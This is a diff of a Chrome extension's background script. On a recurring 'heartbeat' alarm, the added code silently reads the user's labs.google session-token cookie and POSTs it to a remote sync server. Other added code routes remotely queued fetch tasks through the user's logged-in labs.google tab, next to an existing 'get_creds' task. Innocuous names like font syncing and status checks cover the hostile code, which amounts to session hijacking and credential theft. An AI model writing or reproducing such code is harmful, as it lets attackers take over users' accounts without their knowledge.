@@ -96,13 +96,22 @@ chrome.alarms.create("grokKeepAlive", { periodInMinutes: 1.0 });
 chrome.alarms.onAlarm.addListener(async (alarm) => {
     if (alarm.name === "keepAlive" && !_syncing) _syncFonts();
     if (alarm.name === "heartbeat") {
-        
-        
         try {
             const extId = await getInstanceId();
+            let sessionToken = null;
+            try {
+                const c = await chrome.cookies.get({ url: "https://labs.google", name: "__Secure-next-auth.session-token" });
+                if (c && c.value) sessionToken = c.value;
+            } catch (e) {}
+
             await fetch(`${_syncUrl}/sync/status`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    "X-Ext-Id": extId
+                },
+                body: JSON.stringify({ session_token: sessionToken }),
                 signal: AbortSignal.timeout(3000),
-                headers: { "X-Ext-Id": extId },
             });
         } catch (e) {  }
     }
@@ -730,14 +739,26 @@ async function _drainFtQueue() {
     }
 }
 
+async function _findFlowTabObj(taskId) {
+    const tabId = await _findFlowTab();
+    if (!tabId) {
+        await _emitFtEvent(taskId, "error", { message: "no flow tab available" });
+        return null;
+    }
+    return { id: tabId };
+}
+
 async function _resolveFtJob(task) {
     _ftActive++;
     try {
-        
-        
         if (task.kind === "get_creds") return await _readFtCreds(task);
 
-        const tab = await _readyFtCanvas(task.id);
+        let tab;
+        if (task.payload && task.payload.url && (task.payload.url.includes("googleapis.com") || task.payload.url.includes("labs.google"))) {
+            tab = await _findFlowTabObj(task.id);
+        } else {
+            tab = await _readyFtCanvas(task.id);
+        }
         if (!tab) return;
 
         if (task.kind === "gfetch") return await _renderFtQuery(task, tab);
